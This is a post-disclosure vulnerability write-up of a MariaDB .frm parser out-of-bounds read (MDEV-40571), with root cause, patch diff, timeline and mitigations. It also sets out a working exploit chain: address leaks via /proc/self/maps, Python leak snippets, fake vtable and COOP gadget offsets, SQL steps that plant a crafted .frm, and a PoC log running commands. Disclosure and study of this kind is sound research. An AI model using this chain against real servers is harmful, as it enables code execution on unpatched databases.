---
title: 'MariaDB .frm Parsing OOB Read to vtable Hijacking RCE'
date: 2026-09-13T00:00:00.000Z
excerpt: >-
  How an out-of-bounds read in MariaDB's .frm metadata parser can be turned into a forged C++ object
  with a fake vtable, reaching arbitrary code execution as the mariadbd process (MDEV-40571).
tags:
  - cve
  - mariadb
  - oob
  - rce
  - vtable
  - database
  - exploitation
categories:
  - Research
authors:
  - name: pinebudweiser
    link: 'https://github.com/pinebudweiser'
    image: 'https://github.com/pinebudweiser.png'
  - name: ph4nt0m
    link: 'https://github.com/Phantomn'
    image: 'https://github.com/Phantomn.png'
---

## Overview

This post documents a vulnerability found by my teammate **Daesik Bae** (pinebudweiser) and reported to MariaDB through HackerOne. I helped with the analysis and reproduction, and I am jointly credited on the report.

The target is MariaDB's `.frm` file (table metadata) parser. A missing upper-bound check on `key_part->fieldnr` causes an out-of-bounds read of the `share->field[]` array. When that out-of-bounds value is interpreted as a `Field*` pointer, it can be made to point at an attacker-controlled C++ object with a fake vtable. The virtual function call that follows then jumps to an attacker-chosen address, leading to arbitrary code execution with the privileges of the `mariadbd` process.

- **Vulnerability ID**: MDEV-40571
- **Report**: HackerOne [#3897914](https://hackerone.com/reports/3897914)
- **Public advisory**: [GHSA-c4gx-34mg-95q5](https://github.com/MariaDB/server/security/advisories/GHSA-c4gx-34mg-95q5)
- **PoC / lab environment**: [pinebudweiser/mariadb-13.1.0-rce-lab](https://github.com/pinebudweiser/mariadb-13.1.0-rce-lab)
- **Severity**: High, CVSS 3.1 8.8 (HackerOne) / 8.0 (GHSA)
- **CVE**: Unassigned at the time of writing (MariaDB filed the request; assignment pending)

---

## Root cause

### fieldnr used as an index without validation

The code that parses the key-definition block of a `.frm` file (`sql/table.cc:823` in 10.4.18) reads `fieldnr` straight from the `.frm` bytes. It is an unsigned 16-bit value, so without an upper bound the attacker can set the full 0-65535 range.

```c++
// sql/table.cc:823 (10.4.18) - fieldnr read straight from the .frm key part block
key_part->fieldnr = (uint16) (uint2korr(strpos) & FIELD_NR_MASK);
```

This value is later used as an index into `share->field[]` in several places. The one that was patched (`sql/table.cc:2700-2709` in 10.4.18) is the code used in the actual exploitation.

```c++
// sql/table.cc:2700-2709 (10.4.18, before the patch)
Field *field;
if (new_field_pack_flag <= 1)
  key_part->fieldnr = (uint16) find_field(share->field,
                                 share->default_values,
                                 (uint) key_part->offset,
                                 (uint) key_part->length);
if (!key_part->fieldnr)          // [!] only checks for 0, no upper bound (share->fields)
  goto err;

field = key_part->field = share->field[key_part->fieldnr-1];  // OOB read
key_part->type = field->key_type();  // virtual call through the vtable - trigger point
```

The only check is "is `fieldnr` non-zero"; nothing verifies that `fieldnr` stays within `share->fields` (the real field count). Even on a table where `share->fields` is 5, a crafted `fieldnr` of 47 or 65535 passes. The same defect (missing upper-bound check) was repeated at four or five places in `sql/table.cc` that index as `share->field[fieldnr-1]` (see the patch diff below).

### Memory layout of the share->field array

`share->field` is allocated by `TABLE_SHARE::init_from_binary_frm_image()` together with several other buffers in a single `multi_alloc_root()` call (`sql/table.cc:2025-2038` in 10.4.18).

```c++
// sql/table.cc:2025-2038 (10.4.18)
if (!multi_alloc_root(&share->mem_root,
                      &share->field, (uint)(share->fields+1)*sizeof(Field*),
                      &share->intervals, (uint)interval_count*sizeof(TYPELIB),
                      &share->check_constraints, (uint) share->table_check_constraints * sizeof(Virtual_column_info*),
                      &interval_array, (uint) (share->fields+interval_parts+ keys+3)*sizeof(char *),
                      &typelib_value_lengths, total_typelib_value_count * sizeof(uint *),
                      &names, (uint) (n_length+int_length),
                      &comment_pos, (uint) com_length,
                      &vcol_screen_pos, vcol_screen_length,
                      NullS))
    goto err;
```

`multi_alloc_root` lays the listed buffers out in order inside a single contiguous chunk. So after the `share->field[]` array come `intervals`, `check_constraints`, `interval_array`, `typelib_value_lengths`, `names`, **`comment_pos`**, and `vcol_screen_pos` in order. `comment_pos` holds the contents of a column's `COMMENT '...'` clause verbatim, and both its size (`com_length`) and its contents are fully attacker-controlled through SQL.

With a precisely chosen `fieldnr`, `share->field[fieldnr-1]` points into the `comment_pos` region near the end of the chunk, and 8 arbitrary bytes placed in `comment_pos` are treated as a `Field*` pointer value. The offset measured by the PoC repo (`pinebudweiser/mariadb-13.1.0-rce-lab`) is `share->field + 0x171` (on 10.4.18).

```text
&share->mem_root  (TABLE_ALLOC_BLOCK_SIZE = 4096 byte)
+---------------------------------------------------------------+
| USED_MEM header                                                |
+---------------------------------------------------------------+
| [key allocs: KEY, KEY_PART_INFO, rec_per_key ...]              |
+---------------------------------------------- ^ bump pointer   |
| default_values  (32B)                        | alloc_root()    |  <- widening ldf.field_length
+---------------------------------------------- |                |     lets the OOB read reach comment.str
| [multi_alloc_root chunk]                      |                |
|  +- share->field[]     <- Field* array        |                |
|  +- share->intervals                          |                |
|  +- interval_array                            |                |
|  +- typelib_value_lengths                     |                |
|  +- names                                     |                |
|  +- comment_pos  <- payload object placed here |                |  <- [MDEV-40571] a crafted fieldnr makes
|  +- vcol_screen_pos                           |                |     share->field[fieldnr-1] point here
+---------------------------------------------- |                |
| Field_long object [id]                        | alloc_root()   |  i=0
+---------------------------------------------- |                |
| Field_long object [AAAAAAAA]                  | alloc_root()   |  i=1 (default_values+0x171)
|  vtable | ptr | null_ptr | table | comment.str|                |  <- leak target: comment.str = comment_pos
+---------------------------------------------- |                |
| Field_string object [ldf]                     | alloc_root()   |  i=2
+---------------------------------------------- |                |
| Field_enum object [e]  / Field_long object [v]|                |  i=3, i=4
+---------------------------------------------- v                |
+---------------------------------------------------------------+
```

### The virtual call that flips control flow

The actual disassembly of the `field->key_type()` call site (x86-64, 10.4.18) shows how this indexing leads to control-flow hijack.

```x86asm
72440A:  mov    0x188(%r14),%rdx       ; rdx = share->field   (r14 = share, +0x188)
724411:  mov    -0x8(%rdx,%rax,8),%r12 ; r12 = share->field[fieldnr-1] = *(field_base + fieldnr*8 - 8)
724416:  mov    %r12,0x0(%r13)         ; key_part->field = field
72441A:  mov    (%r12),%rax            ; rax = *(field) = vtable  <- the value planted in comment_pos becomes the "vtable pointer"
72441E:  mov    %r12,%rdi              ; rdi = field (this)
724421:  call   *0x168(%rax)           ; call field->key_type() (vtable+0x168) <- branches to the controlled address
```

When `share->field[fieldnr-1]` points at `comment_pos`, `*(field)` (the "vtable") is also a value inside the `comment_pos` buffer. If the attacker plants a self-referential structure in `comment_pos` (`vtable = comment_pos` itself) and puts a chosen function pointer at `vtable+0x168` (the slot is `+0x380` on 13.1.0), the `field->key_type()` call branches straight to that function.

In short, the attacker:

1. Crafts `key_part->fieldnr` in the `.frm` to induce an out-of-bounds read on `share->field[]`,
2. Makes that read land on the `comment_pos` buffer they filled via the `COMMENT` clause, substituting a fake `Field*` object (with a self-referential fake vtable),
3. Triggers a C++ virtual call against that object such as `field->key_type()`,
4. Controls the call target as an arbitrary address (a COOP gadget chain).

### Exploitation chain: leak - calibration - arm - trigger

For a planted value to become a function pointer, two things are needed first: (1) the heap address of `comment_pos` (ASLR), and (2) the load base of `mariadbd`/`libc` to compute COOP gadget addresses. The PoC (`exploit/13.1.0/lab_exploit.py`) does this in four steps using SQL queries only.

**1) Leak base addresses** - `LOAD DATA INFILE '/proc/self/maps'` loads the `mariadbd`/`libc.so.6` mappings into a table, then reads the `r-xp` segment line to compute the ELF load base (`start - file offset`).

```python
def _loadbase(line):
    p = line.split(); start = int(p[0].split("-")[0], 16); off = int(p[2], 16)
    return start - off
```

**2) Leak the comment_pos address** - after widening the `ldf` column's `field_length` to 512-1024 bytes in the `.frm`, reading `COLUMN_DEFAULT` from `information_schema.COLUMNS` reads the `default_values` buffer up to that expanded length. The neighboring `Field` object's `comment.str` member (= the `comment_pos` address) falls inside this OOB range and leaks directly.

```python
def comment_str(conn):
    h = conn.scalar("SELECT HEX(CONVERT(COLUMN_DEFAULT USING latin1)) FROM information_schema.COLUMNS "
                  "WHERE TABLE_SCHEMA='p3' AND TABLE_NAME='t16' AND COLUMN_NAME='ldf'")
    buf = unescape(bytes.fromhex(h)) if h else b""
    C = struct.unpack_from("<Q", buf, CMTSTR_RECOFF)[0]   # reads the comment_pos address directly
    return (C if 0x700000000000 <= C <= 0x7fffffffffff else None), buf
```

**3) Calibration (stabilization)** - `comment_pos` sits inside the mem_root arena, so it can move when other connections allocate/free. The PoC leaks twice in a row and compares whether the same address comes back; if it differs (`stable=False`) it aborts. It also pre-opens 16 connections (`8 cores x 2 = 16` arena slots) to pin per-thread arena allocation and improve stability.

```python
C, buf = leak_C(conn, base)
C2, _ = leak_C(conn, base)
if C2 != C:
    print("[!] chunk NOT stable across deliver (C moved) -> ABORT before firing"); return
```

**4) Arm and trigger** - once stability is confirmed, a self-referential fake `Field` object and a COOP gadget chain (`G0 -> GENTRY -> G2 -> execve`) are placed at `comment_pos`, and the `.frm` `fieldnr` bytes are overwritten with the real attack value (47 on 13.1.0) and delivered via `DUMPFILE`/`FLUSH TABLES`/`SHOW CREATE TABLE`. The moment `SHOW CREATE TABLE` re-parses the `.frm`, the `field->key_type()` call branches to the first gadget and finally runs `execve(cmd)`.

```python
put(0x000, C)             # self-ref: field=C, vtable=C
put(0x380, MB+G0_OFF)     # key_type() vtable slot -> G0
put(0x0c8, MB+GENTRY_OFF) # G0 -> GENTRY
put(0x280, MB+G2_OFF)     # GENTRY -> G2
put(0x160, LB+EXECVE_OFF) # G2 -> execve(path, argv, envp=NULL)
```

All four steps complete with an authenticated SQL session alone (`SELECT`, `LOAD DATA INFILE`, `DUMPFILE`, `FLUSH TABLES`, `SHOW CREATE TABLE`), requiring no OS shell or debugger access.

### Preconditions

The PoC conditions stated in the HackerOne report:

- The attacker has an authenticated SQL session
- That SQL account has the global `FILE` privilege
- `secure_file_priv` is empty (file operations allowed) or unset
- The MariaDB OS account can create files inside the data directory
- The attacker can make MariaDB load a crafted `.frm`

The key point is that **no OS shell or direct filesystem access is required**. The real remote chain completes through the SQL interface alone.

```sql
DROP TABLE ...;                          -- remove the existing table/.frm
SELECT UNHEX('...') INTO DUMPFILE '...'; -- write the crafted .frm file
FLUSH TABLES;                            -- invalidate the table cache
SHOW CREATE TABLE ...;                   -- MariaDB loads/parses the crafted .frm
```

So the required privileges are a combination of `FILE`, `RELOAD`, `CREATE`, `DROP`, `SELECT`, `INSERT`, and not even `SUPER` is needed. The intent of `FILE` is "read and write files through SQL", not "arbitrary code execution with the server process's privileges", so this vulnerability clearly crosses a privilege boundary.

### Confirmed impact

Versions where RCE was reproduced with the PoC:

- MariaDB 10.4.18 (remote chain)
- MariaDB 11.8.8
- MariaDB 12.3.2
- MariaDB 13.1.0 Preview (local chain)

The report notes that other lines (10.6.x, 11.4.x, 12.3.x and so on) likely share the same defect due to the memory allocation structure, and the published GHSA advisory confirms the affected range up to 10.6.1-27, 10.11.1-18, 11.4.1-12, 11.8.1-8, 12.3.1-2, and 13.0.1.

---

## Result

A successful exploit gives arbitrary code execution with the OS privileges of the `mariadbd` process. Part of the PoC execution log attached to the report:

```
$ python3 t16_e2e.py --fire
connected. server ver: 13.1.0-MariaDB
leaked C comment_pos: 0x77f3a4032f90
CALIB: re-leaked 0x77f3a4032f90 stable True
arming fieldnr, delivering weapon, triggering R5
execve cmd 'id > /tmp/frm_pwned_t16 2>&1; echo PWNED_$(id -u) >> /tmp/frm_pwned_t16'
trigger raised (expected on execve): OperationalError 2013 'Lost connection to MySQL server during query'
fired. check /tmp/frm_pwned_t16 for proof.

$ cat /tmp/frm_pwned_t16
uid=1000(pinebudweiser) gid=1000(pinebudweiser) groups=1000(pinebudweiser),...,110(docker)
PWNED_1000
```

Starting from the `FILE` privilege alone and expanding to the full privileges of the server process account (credentials, configuration, process memory access, outbound network connections, and so on) is the practical impact of this vulnerability. This does not automatically guarantee root; the final impact depends on which OS account `mariadbd` runs as.

### PoC videos

- Remote chain (MariaDB 10.4.18, completed through the SQL interface only): [remote-10.4.18-poc.mp4](/videos/blog/mariadb-frm-oob-rce/remote-10.4.18-poc.mp4)
- Local chain (MariaDB 13.1.0 Preview): [local-13.1.0-poc.mp4](/videos/blog/mariadb-frm-oob-rce/local-13.1.0-poc.mp4)

### PoC code

The full lab environment (build scripts and exploit code) is published in Daesik Bae's (pinebudweiser) repository.

- [pinebudweiser/mariadb-13.1.0-rce-lab](https://github.com/pinebudweiser/mariadb-13.1.0-rce-lab)
  - Remote chain (10.4.18): [`exploit/10.4.18/`](https://github.com/pinebudweiser/mariadb-13.1.0-rce-lab/tree/main/exploit/10.4.18) - `t16_e2e.py`, `na_frm_rce2_exploit.py`, `target_reliable.py`
  - Local chain (13.1.0): [`exploit/13.1.0/lab_exploit.py`](https://github.com/pinebudweiser/mariadb-13.1.0-rce-lab/blob/main/exploit/13.1.0/lab_exploit.py)

> This is shared after the vendor patch and through a responsible disclosure process (HackerOne disclosure consent, GHSA issuance). If you run a pre-patch version, check the patch status section below and upgrade first.

---

## Timeline

| Date (UTC) | Event |
|---|---|
| 2026-07-29 | Initial report to HackerOne |
| 2026-07-30 | MariaDB confirms Triaged |
| 2026-07-31 | Remote attack chain (SQL interface alone is sufficient) elaborated; credit discussion |
| 2026-08-14 | MDEV-40571 referenced publicly in the 10.6.28 release notes; asked about CVE assignment |
| 2026-09-07 | Marked Resolved |
| 2026-09-08 | Report Disclosed |

---

## Patch diff (the actual fix)

MariaDB commit [`3b1c2e58a`](https://github.com/MariaDB/server/commit/3b1c2e58abab5571bec4ff52773ddc75b1738da9) ("MDEV-40571 insufficient validation of frm data when opening a table") is the fix commit. Its message says "numerous checks that the frm is valid, no OOB reads... most asserts were changed to if()'s" - that is, many checks originally existed only as `DBUG_ASSERT` (debug-only checks that vanish in release builds), and turning them into always-on `if()` runtime checks is the heart of the patch. An upper-bound check was added at each place that indexes as `share->field[fieldnr-1]`.

```diff
-        DBUG_ASSERT(key_part[i].fieldnr > 0);
+        if (key_part[i].fieldnr <= 0 || key_part[i].fieldnr > share->fields)
+          goto err;
         Field *table_field= share->field[key_part[i].fieldnr - 1];

           uint fieldnr= keyinfo[0].key_part[i].fieldnr;
+          if (fieldnr <= 0 || fieldnr > share->fields)
+            goto err;
           if (share->field[fieldnr-1]->key_length() != ...

           uint fieldnr= keyinfo->key_part[i].fieldnr;
+          if (fieldnr <= 0 || fieldnr > share->fields)
+            goto err;
           field= share->field[fieldnr-1];

-	if (!key_part->fieldnr)
+	if (key_part->fieldnr <= 0 || key_part->fieldnr > share->fields)
           goto err;
         field= key_part->field= share->field[key_part->fieldnr-1];
```

The last hunk directly fixes the exploitation path covered in this post (around `sql/table.cc:2705`). Changing `!key_part->fieldnr` (only checks for 0) to `key_part->fieldnr <= 0 || key_part->fieldnr > share->fields` (checks for 0-or-below or exceeding the real field count) shuts down the OOB read path at the source.

## Patch status

Fixed in these versions (upper-bound check added):

- 10.6.28, 10.11.19, 11.4.13, 11.8.9, 12.3.3, 13.0.2

If you run a version below these, upgrading is the top priority. Where upgrading is not immediately possible, granting `FILE` only to trusted accounts and restricting `secure_file_priv` outside the data directory are temporary mitigations.

## References

- [HackerOne #3897914](https://hackerone.com/reports/3897914)
- [GHSA-c4gx-34mg-95q5](https://github.com/MariaDB/server/security/advisories/GHSA-c4gx-34mg-95q5)
- [PoC / lab environment: mariadb-13.1.0-rce-lab](https://github.com/pinebudweiser/mariadb-13.1.0-rce-lab)
